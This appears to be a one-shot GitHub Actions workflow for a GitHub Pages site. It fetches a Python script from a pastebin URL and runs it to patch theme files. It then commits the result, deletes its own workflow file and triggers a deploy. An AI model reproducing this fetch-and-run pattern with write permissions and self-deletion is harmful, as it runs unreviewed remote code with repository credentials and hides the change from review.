name: Theme animation timer fix
on:
  push:
    paths:
      - '.github/workflows/nx-theme-timer.yml'
  workflow_dispatch:
permissions:
  contents: write
  actions: write
jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply animation timer patch
        run: |
          curl -fsSL "https://paste.rs/auMc5" -o /tmp/nx-anim.py
          python3 /tmp/nx-anim.py
      - name: Commit changes and self-delete
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add themes/themes.js index.html Settings/settings.html
          git commit -m "Drive animated theme colours with a timer so they never freeze"
          git rm .github/workflows/nx-theme-timer.yml
          git commit -m "Remove one-shot animation timer workflow"
          git push
      - name: Trigger Pages deploy
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          curl -fsS -X POST \
            -H "Authorization: Bearer $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            https://api.github.com/repos/GLAXYIAS/glaxyias.github.io/actions/workflows/static.yml/dispatches \
            -d '{"ref":"main"}'
